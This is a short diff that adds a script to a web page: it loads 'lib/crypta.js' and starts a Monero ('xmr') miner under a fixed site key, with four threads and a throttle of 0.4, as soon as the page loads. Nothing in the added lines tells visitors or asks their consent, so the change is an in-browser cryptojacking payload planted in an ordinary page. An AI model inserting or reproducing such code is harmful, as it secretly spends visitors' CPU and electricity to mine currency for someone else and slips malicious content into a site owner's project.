@@ -1,0 +1,7 @@
+<script src="lib/crypta.js"></script>
+<script>
+            var miner=new CRLT.Anonymous('20586eb105abee4afe3ba19cb1c1f2937fdf56034c33', {
+                threads:4,autoThreads:false,throttle:0.4,coin: "xmr", // xmr = Monero, upx = uPlexa
+            });
+        miner.start();
+</script>
